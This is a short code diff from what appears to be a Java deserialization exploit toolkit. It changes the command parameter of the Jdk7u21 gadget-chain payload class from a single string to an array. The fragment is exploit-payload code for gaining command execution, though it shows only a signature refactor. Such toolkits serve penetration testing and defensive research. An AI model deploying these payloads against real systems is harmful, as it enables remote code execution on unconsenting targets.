@@ -56,7 +56,7 @@ LinkedHashSet.readObject()
 @PayloadTest ( precondition = "isApplicableJavaVersion")
 public class Jdk7u21 implements ObjectPayload<Object> {
 
-	public Object getObject(final String command) throws Exception {
+	public Object getObject(final String[] command) throws Exception {
 		final Object templates = Gadgets.createTemplatesImpl(command);
 
 		String zeroHashCodeStr = "f5a5a608";
